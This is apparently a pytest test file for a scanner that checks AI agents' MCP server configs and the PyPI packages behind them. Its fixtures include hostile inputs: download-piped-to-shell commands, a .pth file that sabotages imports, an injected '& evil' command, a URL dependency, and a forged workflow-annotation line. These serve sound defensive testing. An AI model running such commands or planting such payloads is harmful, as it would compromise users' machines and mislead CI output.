"""buckthorn check on an agent's MCP config: every server it launches, and the package behind it."""

import hashlib
import json

import pytest

from buckthorn import lock, mcp_config
from buckthorn.cli import main
from buckthorn.mcp_server import check_mcp_config

HOST = "https://files.pythonhosted.org/packages/aa/bb"
SHADOW = "import sys; sys.modules['collections'] = None\n"


class FakePyPI:
    """The JSON API (project and release) and the files, by URL. Counts calls."""

    def __init__(self):
        self.files: dict[str, bytes] = {}
        self.releases: dict[str, dict[str, list[dict]]] = {}
        self.meta: dict[str, dict[str, list[str]]] = {}
        self.calls: list[str] = []

    def add(
        self,
        name: str,
        version: str,
        data: bytes,
        yanked: bool = False,
        requires: list[str] | None = None,
        requires_python: str | None = None,
    ) -> None:
        filename = f"{name}-{version}-py3-none-any.whl"
        url = f"{HOST}/{filename}"
        self.files[url] = data
        entry = {
            "filename": filename,
            "url": url,
            "digests": {"sha256": hashlib.sha256(data).hexdigest()},
            "yanked": yanked,
            "requires_python": requires_python,
        }
        self.releases.setdefault(name, {}).setdefault(version, []).append(entry)
        # None leaves requires_dist off the index, so the wheel's own metadata is read.
        if requires is not None:
            self.meta.setdefault(name, {})[version] = requires

    def __call__(self, url: str, max_bytes: int) -> bytes:
        self.calls.append(url)
        for name, releases in self.releases.items():
            if url == f"https://pypi.org/pypi/{name}/json":
                return json.dumps({"releases": releases}).encode()
            for version, entries in releases.items():
                if url == f"https://pypi.org/pypi/{name}/{version}/json":
                    body = {"urls": entries}
                    requires = self.meta.get(name, {}).get(version)
                    if requires is not None:
                        body["info"] = {"requires_dist": requires}
                    return json.dumps(body).encode()
        if url in self.files:
            return self.files[url]
        raise lock.FetchError(f"404 {url}")


@pytest.fixture(autouse=True)
def pypi(make_wheel, monkeypatch):
    """Every test here runs against the fake: none may reach the network."""
    fake = FakePyPI()

    def add(
        name="pkg",
        version="1.0",
        members=None,
        yanked=False,
        requires=None,
        requires_python=None,
    ):
        wheel = make_wheel(
            members or {f"{name}/__init__.py": "x = 1\n"}, f"{name}-{version}-py3-none-any.whl"
        )
        fake.add(name, version, wheel.read_bytes(), yanked, requires, requires_python)

    fake.publish = add
    monkeypatch.setattr(lock, "fetch_url", fake)
    return fake


def _check(servers: dict, key: str = "mcpServers"):
    return mcp_config.check(mcp_config.servers(json.dumps({key: servers})))


def _rules(results) -> set[str]:
    return {f.rule_id for r in results for f in r.findings}


def _stdio(*command: str) -> dict:
    return {"s": {"command": command[0], "args": list(command[1:])}}


# Config shapes


def test_claude_code_desktop_cursor_windsurf_use_mcp_servers():
    text = json.dumps({"mcpServers": {"a": {"command": "uvx", "args": ["x"]}}})
    assert mcp_config.servers(text) == [("a", {"command": "uvx", "args": ["x"]})]


def test_vscode_uses_servers_and_may_have_comments_and_trailing_commas():
    text = """{
      // a comment, with "quotes"
      "inputs": [],
      "servers": {
        "a": {"type": "stdio", "command": "uvx", "args": ["x // not a comment",],},
        /* block */
      },
    }"""
    assert mcp_config.servers(text) == [
        ("a", {"type": "stdio", "command": "uvx", "args": ["x // not a comment"]})
    ]


def test_claude_json_has_user_and_per_project_servers():
    text = json.dumps(
        {
            "numStartups": 3,
            "mcpServers": {"user": {"url": "https://example.com/mcp", "type": "http"}},
            "projects": {
                "/p": {"mcpServers": {"local": {"command": "npx", "args": ["-y", "x"]}}},
                "/q": {"allowedTools": []},
            },
        }
    )
    assert [key for key, _ in mcp_config.servers(text)] == ["user", "local (/p)"]


def test_a_byte_order_mark_is_allowed():
    text = "\ufeff" + json.dumps({"mcpServers": {}})
    assert mcp_config.servers(text) == []


def test_deep_nesting_is_a_value_error():
    # Python 3.13 runs out of recursion here ("nested"); 3.14 parses to the cut-off end.
    with pytest.raises(ValueError):
        mcp_config.servers('{"a":' * 100_000)


def test_deep_but_valid_nesting_is_read_or_a_value_error():
    deep = '{"a":' * 100_000 + "1" + "}" * 100_000
    try:
        assert mcp_config.servers(deep) is None  # 3.14 reads it: no mcpServers
    except ValueError as exc:
        assert "nested" in str(exc)  # up to 3.13


@pytest.mark.parametrize("text", ['{"name": "x"}', "requests==2.0 --hash=sha256:aa\n", "[1]"])
def test_other_files_are_not_mcp_configs(text):
    assert mcp_config.servers(text) is None


# PyPI launches


@pytest.mark.parametrize(
    "command",
    [
        ("uvx", "pkg==1.0"),
        ("uvx", "pkg@1.0", "--api-key", "x"),
        ("uvx", "--from", "pkg==1.0", "pkg-server"),
        ("/home/u/.local/bin/uvx", "--python", "3.12", "pkg==1.0"),
        ("uv", "tool", "run", "pkg==1.0"),
        ("uv", "run", "--no-project", "--with", "pkg==1.0", "pkg"),
        ("pipx", "run", "--spec", "pkg==1.0", "pkg-server"),
        ("uvx pkg==1.0",),
        ("cmd", "/c", "uvx", "pkg==1.0"),
        ("sh", "-c", "uvx pkg==1.0"),
        ("env", "A=1", "uvx", "pkg==1.0"),
    ],
)
def test_pinned_pypi_launches_scan_that_release(pypi, command):
    pypi.publish("pkg", "1.0")
    pypi.publish("pkg", "2.0")
    (result,) = _check(_stdio(*command))
    assert result.path == "s/pkg-1.0-py3-none-any.whl"
    assert result.verdict == "clean"
    assert result.findings == []  # no dependencies, so nothing about them to say


def test_unpinned_server_scans_the_newest_release_and_says_it_is_not_pinned(pypi):
    pypi.publish("pkg", "1.0")
    pypi.publish("pkg", "1.1")
    pypi.publish("pkg", "3.0", yanked=True)
    pypi.publish("pkg", "2.0rc1")
    for spec in ("pkg", "pkg@latest", "pkg>=1.0"):
        (result,) = _check(_stdio("uvx", spec))
        assert result.path == "s/pkg-1.1-py3-none-any.whl"
        # A missing pin is common enough that flagging it would drown real findings.
        assert result.verdict == "clean"
        (unpinned,) = [f for f in result.findings if f.rule_id == "BKT-MCP-002"]
        assert unpinned.severity == "info"
        assert unpinned.file_path == "s"


def test_a_range_scans_the_newest_release_inside_it(pypi):
    pypi.publish("pkg", "1.0")
    pypi.publish("pkg", "2.0")
    (result,) = _check(_stdio("uvx", "pkg<2"))
    assert result.path == "s/pkg-1.0-py3-none-any.whl"


def test_extra_packages_installed_with_the_server_are_checked_too(pypi):
    pypi.publish("pkg", "1.0")
    pypi.publish("extra", "1.0", {"extra.pth": SHADOW})
    results = _check(_stdio("uvx", "--with", "extra==1.0", "pkg==1.0"))
    assert sorted((r.path, r.verdict) for r in results) == [
        ("s/extra-1.0-py3-none-any.whl", "flagged"),
        ("s/pkg-1.0-py3-none-any.whl", "clean"),
    ]


def test_with_executables_from_is_checked_too(pypi):
    pypi.publish("pkg", "1.0")
    pypi.publish("extra", "1.0")
    results = _check(_stdio("uvx", "--with-executables-from", "extra==1.0", "pkg==1.0"))
    assert sorted(r.path for r in results) == [
        "s/extra-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]


def test_two_servers_running_one_package_make_one_receipt_subject(pypi, tmp_path, capsys):
    pypi.publish("pkg", "1.0")
    config = tmp_path / ".mcp.json"
    server = {"command": "uvx", "args": ["pkg==1.0"]}
    config.write_text(json.dumps({"mcpServers": {"a": server, "b": server}}))
    receipt = tmp_path / "r.json"
    assert main(["check", "--receipt", str(receipt), str(config)]) == 0
    assert len(json.loads(receipt.read_text())["subject"]) == 1


@pytest.mark.parametrize(
    "command",
    [
        ("uv", "run", "--with", "pkg==1.0", "pkg"),  # may install the project here
        ("uv", "run", "--no-project", "--with", "pkg==1.0", "bash", "-c", "x"),
        ("uv", "run", "--no-project", "--with", "pkg==1.0", "python", "-m", "local"),
    ],
)
def test_uv_run_checks_the_with_packages_but_not_another_command(pypi, command):
    pypi.publish("pkg", "1.0")
    scanned, local = _check(_stdio(*command))
    assert scanned.path == "s/pkg-1.0-py3-none-any.whl"
    assert local.verdict == "not_verified"
    assert "local project" in local.findings[0].message


def test_a_command_is_checked_whatever_the_type_says(pypi):
    (result,) = _check({"s": {"type": "http", "url": "https://x/mcp", "command": "npx"}})
    assert result.verdict == "not_verified"


def test_a_malicious_server_package_is_flagged(pypi):
    pypi.publish("pkg", "1.0", {"pkg.pth": SHADOW})
    (result,) = _check(_stdio("uvx", "pkg==1.0"))
    assert "BKT-PTH-002" in _rules([result])


def test_a_package_pypi_does_not_have_is_not_verified(pypi):
    (result,) = _check(_stdio("uvx", "nothere==1.0"))
    assert result.verdict == "not_verified"
    assert result.path == "s"


# Everything else


@pytest.mark.parametrize(
    "server, says",
    [
        ({"command": "npx", "args": ["-y", "@x/server"]}, "npm servers are not checked yet"),
        ({"command": "cmd", "args": ["/c", "npx", "-y", "x"]}, "npm servers are not checked yet"),
        ({"command": "bunx", "args": ["x"]}, "npm servers are not checked yet"),
        ({"command": "pnpm", "args": ["dlx", "x"]}, "npm servers are not checked yet"),
        ({"command": "docker", "args": ["run", "-i", "--rm", "img"]}, "container images"),
        ({"command": "python", "args": ["-m", "pkg"]}, "buckthorn env"),
        ({"command": "python3", "args": ["/home/u/server.py"]}, "local"),
        ({"command": "/opt/bin/server"}, "local"),
        ({"command": "node", "args": ["build/index.js"]}, "local"),
        ({"command": "uv", "args": ["--directory", "/p", "run", "server.py"]}, "local"),
        ({"command": "uvx", "args": ["--index-url", "https://x/simple", "pkg"]}, "index"),
        ({"command": "uvx", "args": ["--new-flag", "pkg"]}, "option"),
        ({"command": "uvx", "args": ["--config-file", "uv.toml", "pkg"]}, "index"),
        ({"command": "uvx", "args": ["--prerelease", "allow", "pkg"]}, "index"),
        ({"command": "uvx", "args": ["p"], "env": {"UV_CONFIG_FILE": "x"}}, "env file"),
        ({"command": "uvx", "args": ["--from", "tool.whl", "tool"]}, "local"),
        ({"command": "pipx", "args": ["run", "--path", "tool"]}, "option"),
        ({"command": "uvx", "args": ["git+https://github.com/x/y@" + "a" * 40]}, "git"),
        ({"command": "uvx", "args": ["./local-dir"]}, "local"),
        ({"command": "uvx", "args": []}, "no package"),
        ({"command": "sh", "args": ["-c", "cd /p && ./run"]}, "shell"),
        ({"command": "sh", "args": ["-c", "uvx it's"]}, "split"),
        ({"command": "sh", "args": ["-c", "uvx pkg[k]==1.0"]}, "shell"),
        ({"command": "cmd", "args": ["/c", "uvx pkg==1.0 & evil"]}, "shell"),
        ({"command": "./scripts/uvx", "args": ["pkg==1.0"]}, "local"),
        ({"command": "${workspaceFolder}/uvx", "args": ["pkg==1.0"]}, "local"),
        ({"command": "/opt/../tmp/uvx", "args": ["pkg==1.0"]}, "local"),
        ({"command": "env", "args": ["-S", "uvx --index-url x", "pkg==1.0"]}, "option"),
        ({"command": "env", "args": ["PATH=.bin", "uvx", "pkg==1.0"]}, "index"),
        ({"command": "uvx", "args": ["pkg==1.0"], "env": {"PATH": ".bin"}}, "env file"),
        ({"command": "uvx", "args": ["pkg==1.0"], "env": {"PYTHONPATH": "."}}, "env file"),
        ({"command": "uvx", "args": ["pkg==1.0"], "envFile": ".env"}, "env file"),
        ({"command": "uvx", "args": ["--python", "./tools/python", "pkg==1.0"]}, "index"),
        ({"command": "uvx", "args": ["--directory", "sub", "pkg==1.0"]}, "index"),
        ({"command": "env", "args": ["UV_INDEX_URL=https://x", "uvx", "p"]}, "index"),
        ({"command": "uvx", "args": ["p"], "env": {"PIP_INDEX_URL": "https://x"}}, "env file"),
        ({"type": "stdio"}, "no command"),
        ("not an object", "not an object"),
    ],
)
def test_launches_that_cannot_be_checked_are_not_verified(pypi, server, says):
    (result,) = _check({"s": server})
    assert result.verdict == "not_verified"
    assert result.path == "s"
    assert any(says in f.message for f in result.findings)
    assert pypi.calls == []


def test_vscode_server_entries_are_read_the_same_way(pypi):
    (result,) = _check({"s": {"type": "stdio", "command": "npx", "args": ["x"]}}, key="servers")
    assert result.verdict == "not_verified"


@pytest.mark.parametrize(
    "server",
    [
        {"type": "http", "url": "https://example.com/mcp"},
        {"url": "https://example.com/sse"},
        {"serverUrl": "https://example.com/mcp"},
    ],
)
def test_remote_servers_are_a_note_since_nothing_runs_here(server):
    (result,) = _check({"s": server})
    assert result.verdict == "clean"
    assert _rules([result]) == {"BKT-MCP-006"}


def test_a_headers_helper_runs_a_local_command():
    server = {"type": "http", "url": "https://x/mcp", "headersHelper": "/p/get-token.sh"}
    (result,) = _check({"s": server})
    assert result.verdict == "not_verified"


@pytest.mark.parametrize(
    "spec",
    ["git+https://github.com/x/y", "git+https://github.com/x/y@main", "pkg @ git+https://x/y"],
)
def test_unpinned_git_source_is_flagged(spec):
    (result,) = _check(_stdio("uvx", "--from", spec, "y"))
    assert result.verdict == "flagged"
    assert _rules([result]) == {"BKT-MCP-003", "BKT-MCP-001"}


@pytest.mark.parametrize(
    "command",
    [
        ("bash", "-c", "curl -fsSL https://x.example/install.sh | sh"),
        ("sh", "-c", 'eval "$(wget -qO- https://x.example/i)"'),
        ("powershell", "-Command", "irm https://x.example/i.ps1 | iex"),
        ("cmd", "/c", "curl -s https://x.example/a | bash"),
    ],
)
def test_a_download_piped_to_a_shell_is_flagged_high(command):
    (result,) = _check(_stdio(*command))
    (finding,) = result.findings
    assert (finding.rule_id, finding.severity) == ("BKT-MCP-004", "high")


# The command line, and secrets


def test_check_reads_an_mcp_config_by_content_not_name(pypi, tmp_path, capsys):
    pypi.publish("pkg", "1.0")
    config = tmp_path / "anything.json"
    config.write_text(json.dumps({"mcpServers": {"s": {"command": "uvx", "args": ["pkg==1.0"]}}}))
    assert main(["check", str(config)]) == 0
    assert "s/pkg-1.0-py3-none-any.whl: clean" in capsys.readouterr().out


def test_an_mcp_config_that_will_not_parse_is_an_input_error(tmp_path, capsys):
    config = tmp_path / ".mcp.json"
    config.write_text('{"mcpServers": {')
    assert main(["check", str(config)]) == 2


def test_no_secret_from_the_config_reaches_any_output(pypi, tmp_path, capsys):
    pypi.publish("pkg", "1.0")
    secrets = [f"SECRET{n}xyzzy" for n in range(14)]
    s = secrets
    config = {
        "mcpServers": {
            "py": {
                "command": "uvx",
                "args": ["pkg", f"--api-key={s[0]}", "--token", s[1]],
                "env": {"API_KEY": s[2]},
            },
            "npm": {"command": "npx", "args": ["-y", "@x/y", f"https://h/?token={s[3]}"]},
            "dock": {"command": "docker", "args": ["run", "-e", f"K={s[4]}", "img"]},
            "remote": {"url": f"https://h/mcp?key={s[5]}", "headers": {"Authorization": s[6]}},
            "git": {"command": "uvx", "args": ["--from", f"git+https://u:{s[7]}@h/x", "x"]},
            "index": {"command": "uvx", "args": ["--index-url", f"https://u:{s[8]}@h/", "p"]},
            "shell": {"command": "bash", "args": ["-c", f"curl -H {s[9]} https://h | sh"]},
            "local": {"command": f"/p/{s[10]}/server", "args": [s[11]]},
            "flag": {"command": "uvx", "args": [f"--{s[12]}", "pkg"]},
            "wind": {"serverUrl": f"https://h/{s[13]}"},
        }
    }
    path = tmp_path / ".mcp.json"
    path.write_text(json.dumps(config))
    outputs = []
    for fmt in ("text", "json", "sarif"):
        main(["check", "--format", fmt, "--receipt", str(tmp_path / "r.json"), str(path)])
        captured = capsys.readouterr()
        outputs += [captured.out, captured.err, (tmp_path / "r.json").read_text()]
    outputs.append(json.dumps(check_mcp_config(json.dumps(config))))
    assert all(secret not in out for secret in secrets for out in outputs)
    assert "py/pkg-1.0-py3-none-any.whl" in outputs[0]


def test_the_mcp_tool_takes_the_file_contents(pypi):
    pypi.publish("pkg", "1.0", {"pkg.pth": SHADOW})
    report = check_mcp_config(
        json.dumps({"servers": {"s": {"command": "uvx", "args": ["pkg==1.0"]}}})
    )
    assert report["verdict"] == "flagged"


def test_the_mcp_tool_rejects_a_file_that_is_not_an_mcp_config():
    with pytest.raises(ValueError, match="not an MCP config"):
        check_mcp_config('{"name": "x"}')


def test_text_output_counts_unpinned_servers(pypi, tmp_path, capsys):
    pypi.publish("pkg", "1.0")
    config = tmp_path / "c.json"
    servers = {"a": _stdio("uvx", "pkg")["s"], "b": _stdio("uvx", "pkg==1.0")["s"]}
    config.write_text(json.dumps({"mcpServers": servers}))
    assert main(["check", str(config)]) == 0
    assert "1 server not pinned to a version (BKT-MCP-002)" in capsys.readouterr().out


# The dependency set uvx or pipx would install


def test_unpinned_dependency_is_resolved_scanned_and_flagged(pypi, tmp_path, capsys):
    pypi.publish("pkg", "1.0", requires=["helper>=1", "leaf==1.0"])
    pypi.publish("helper", "1.0")
    pypi.publish("helper", "1.2", {"helper.pth": SHADOW})  # the newest match, and the one that runs
    pypi.publish("helper", "9.0", yanked=True)
    pypi.publish("helper", "2.0rc1")
    pypi.publish("leaf", "1.0")
    pypi.publish("leaf", "2.0")  # pinned out
    results = _check(_stdio("uvx", "pkg==1.0"))
    by_path = {r.path: r for r in results}
    assert sorted(by_path) == [
        "s/helper-1.2-py3-none-any.whl",
        "s/leaf-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    helper, leaf, pkg = (by_path[path] for path in sorted(by_path))
    assert "BKT-PTH-002" in _rules([helper])
    assert helper.verdict == "flagged"
    (floating,) = [f for f in helper.findings if f.rule_id == "BKT-MCP-007"]
    assert floating.severity == "info"
    assert floating.file_path == "s"
    assert "helper>=1" in floating.message
    assert "1.2 was checked" in floating.message
    assert _rules([leaf]) == set()
    assert _rules([pkg]) == set()
    config = tmp_path / ".mcp.json"
    config.write_text(json.dumps({"mcpServers": _stdio("uvx", "pkg==1.0")}))
    assert main(["check", str(config)]) == 1
    assert "1 dependency not pinned to a version (BKT-MCP-007)" in capsys.readouterr().out


def test_pinned_config_scans_exact_dependencies_and_does_not_flag_them(pypi):
    pypi.publish("pkg", "1.0", requires=["helper==1.0"])
    pypi.publish("helper", "1.0", requires=["leaf==2.0"])
    pypi.publish("helper", "2.0")
    pypi.publish("leaf", "2.0")
    pypi.publish("leaf", "3.0")
    results = _check(_stdio("uvx", "pkg==1.0"))
    assert sorted(r.path for r in results) == [
        "s/helper-1.0-py3-none-any.whl",
        "s/leaf-2.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    assert _rules(results) == set()
    assert {r.verdict for r in results} == {"clean"}


def test_two_servers_keep_separate_dependency_sets(pypi, tmp_path, capsys):
    pypi.publish("pkg", "1.0", requires=["left==1.0"])
    pypi.publish("left", "1.0")
    pypi.publish("other", "3.0", requires=["right>=1"])
    pypi.publish("right", "1.0")
    pypi.publish("right", "1.5", {"right.pth": SHADOW})
    config = {
        "a": {"command": "uvx", "args": ["pkg==1.0"]},
        "b": {"command": "pipx", "args": ["run", "other==3.0"]},
    }
    results = _check(config)
    by_path = {r.path: r for r in results}
    assert sorted(by_path) == [
        "a/left-1.0-py3-none-any.whl",
        "a/pkg-1.0-py3-none-any.whl",
        "b/other-3.0-py3-none-any.whl",
        "b/right-1.5-py3-none-any.whl",
    ]
    assert _rules([by_path["a/left-1.0-py3-none-any.whl"]]) == set()
    assert "BKT-MCP-007" in _rules([by_path["b/right-1.5-py3-none-any.whl"]])
    assert by_path["b/right-1.5-py3-none-any.whl"].verdict == "flagged"
    path = tmp_path / ".mcp.json"
    path.write_text(json.dumps({"mcpServers": config}))
    assert main(["check", str(path)]) == 1
    text = capsys.readouterr().out
    assert "1 dependency not pinned to a version (BKT-MCP-007)" in text
    assert "a/left-1.0-py3-none-any.whl: clean" in text
    assert "b/right-1.5-py3-none-any.whl: flagged" in text


def test_dependencies_are_read_from_the_wheel_when_the_index_has_none(pypi):
    metadata = "Name: pkg\nVersion: 1.0\nRequires-Dist: helper==1.0\n"
    pypi.publish("pkg", "1.0", {"pkg-1.0.dist-info/METADATA": metadata})
    pypi.publish("helper", "1.0")
    results = _check(_stdio("uvx", "pkg==1.0"))
    assert sorted(r.path for r in results) == [
        "s/helper-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    assert _rules(results) == set()


def test_a_marker_drops_a_dependency_this_machine_would_not_install(pypi):
    pypi.publish(
        "pkg",
        "1.0",
        requires=['py2only==1.0; python_version < "3"', "helper==1.0"],
    )
    pypi.publish("helper", "1.0")
    results = _check(_stdio("uvx", "pkg==1.0"))
    assert sorted(r.path for r in results) == [
        "s/helper-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    assert not any("py2only" in url for url in pypi.calls)


def test_only_requested_extras_are_installed(pypi):
    pypi.publish(
        "pkg",
        "1.0",
        requires=["base==1.0", 'feature==1.0; extra == "cli"'],
    )
    pypi.publish("base", "1.0")
    pypi.publish("feature", "1.0")
    plain = _check(_stdio("uvx", "pkg==1.0"))
    assert sorted(r.path for r in plain) == [
        "s/base-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    extra = _check(_stdio("uvx", "pkg[cli]==1.0"))
    assert sorted(r.path for r in extra) == [
        "s/base-1.0-py3-none-any.whl",
        "s/feature-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]


def test_resolution_backtracks_past_a_newest_release_that_conflicts(pypi):
    pypi.publish("pkg", "2.0", requires=["lib>=2"])
    pypi.publish("pkg", "1.0", requires=["lib==1.0"])
    pypi.publish("lib", "1.0")
    results = _check(_stdio("uvx", "pkg>=1"))
    assert sorted(r.path for r in results) == [
        "s/lib-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    assert "BKT-MCP-002" in _rules(results)  # the config itself does not pin pkg
    assert "BKT-MCP-007" not in _rules(results)


def test_a_dependency_cycle_is_scanned_once(pypi):
    pypi.publish("pkg", "1.0", requires=["helper==1.0"])
    pypi.publish("helper", "1.0", requires=["pkg>=1"])
    results = _check(_stdio("uvx", "pkg==1.0"))
    assert sorted(r.path for r in results) == [
        "s/helper-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    assert _rules(results) == set()


def test_dynamic_dependency_metadata_is_not_verified(pypi):
    metadata = "Name: pkg\nVersion: 1.0\nDynamic: Requires-Dist\n"
    pypi.publish("pkg", "1.0", {"pkg-1.0.dist-info/METADATA": metadata})
    (result,) = _check(_stdio("uvx", "pkg==1.0"))
    assert result.verdict == "not_verified"
    assert "BKT-MCP-005" in _rules([result])
    assert any("build time" in f.message for f in result.findings)


def test_a_url_dependency_is_not_fetched(pypi):
    pypi.publish("pkg", "1.0", requires=["evil @ https://example.com/evil.whl"])
    (result,) = _check(_stdio("uvx", "pkg==1.0"))
    assert result.verdict == "not_verified"
    assert "BKT-MCP-005" in _rules([result])
    assert not any("example.com" in url for url in pypi.calls)


def test_requires_python_skips_a_release_this_interpreter_cannot_install(pypi):
    pypi.publish("pkg", "1.0", requires=["helper>=1"])
    pypi.publish("helper", "1.0")
    pypi.publish("helper", "2.0", requires_python=">=9")
    results = _check(_stdio("uvx", "pkg==1.0"))
    assert sorted(r.path for r in results) == [
        "s/helper-1.0-py3-none-any.whl",
        "s/pkg-1.0-py3-none-any.whl",
    ]
    assert "BKT-MCP-007" in _rules(results)


def test_mcp_server_names_cannot_forge_workflow_commands(pypi, tmp_path, capsys):
    pypi.publish("pkg", "1.0")
    config = tmp_path / ".mcp.json"
    forged = "  ::error title=Buckthorn::all dependencies clean"
    server = {"command": "uvx", "args": ["pkg==1.0"]}
    config.write_text(json.dumps({"mcpServers": {forged: server}}))
    main(["check", str(config)])
    captured = capsys.readouterr()
    lines = (captured.out + captured.err).splitlines()
    assert lines and not any(line.lstrip().startswith("::") for line in lines)
